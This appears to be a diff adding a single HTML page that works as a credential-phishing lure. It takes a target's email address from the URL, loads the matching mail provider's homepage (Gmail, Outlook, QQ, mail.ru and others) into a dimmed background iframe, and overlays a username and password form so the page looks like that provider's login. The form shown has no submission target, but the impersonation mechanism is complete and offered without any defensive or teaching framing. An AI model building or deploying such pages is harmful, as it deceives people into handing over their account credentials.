@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic Login Display</title>
+    <style>
+        /* Ensure the iframe covers the entire background */
+        #homepageIframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1; /* Positioned behind the overlay */
+        }
+
+        /* Overlay to make the iframe inactive */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.5); /* Semi-transparent background */
+            pointer-events: none; /* Prevents user interactions with this overlay */
+            z-index: 2; /* Positioned in front of the iframe */
+        }
+
+        /* Style the login display */
+        #loginContainer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3; /* Positioned in front of the overlay */
+            background: rgba(255, 255, 255, 0.9); /* Slightly transparent background */
+            padding: 20px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Iframe to load the homepage of the domain -->
+    <iframe id="homepageIframe" src="" title="Homepage"></iframe>
+
+    <!-- Overlay to make the iframe inactive -->
+    <div id="overlay"></div>
+
+    <!-- Login display container -->
+    <div id="loginContainer">
+        <!-- Your login form or other content goes here -->
+        <h2>Login Form</h2>
+        <form>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username"><br><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password"><br><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Extract the domain from the query string
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const email = urlParams.get('files');
+        
+        if (email) {
+            const [username, emailDomain] = email.split('@').map(part => part.toLowerCase());
+
+            // Define the mapping of email domains to their homepages
+            const domainHomepages = {
+                'gmail.com': 'https://www.google.com/gmail/',
+                'outlook.com': 'https://outlook.live.com/',
+                'yahoo.com': 'https://www.yahoo.com/',
+                'hotmail.com': 'https://outlook.live.com/',
+                'aol.com': 'https://www.aol.com/',
+                'zoho.com': 'https://www.zoho.com/',
+                'protonmail.com': 'https://protonmail.com/',
+                '126.com': 'https://www.126.com/',
+                '163.com': 'https://www.163.com/',
+                'sina.com': 'https://www.sina.com.cn/',
+                'qq.com': 'https://www.qq.com/',
+                'mail.ru': 'https://mail.ru/',
+                'sohu.com': 'https://www.sohu.com/',
+                'tom.com': 'https://www.tom.com/',
+                'aliyun.com': 'https://www.aliyun.com/',
+                '21cn.com': 'https://www.21cn.com/',
+                'cn.com': 'https://www.cn.com/',
+                'default': 'https://www.example.com/' // Fallback URL
+            };
+
+            // Set the iframe source to the homepage of the domain or fallback URL
+            const homepageUrl = domainHomepages[emailDomain] || domainHomepages['default'];
+            document.getElementById('homepageIframe').src = homepageUrl;
+        } else {
+            alert('No email parameter found in the query string.');
+        }
+    </script>
+</body>
+</html>
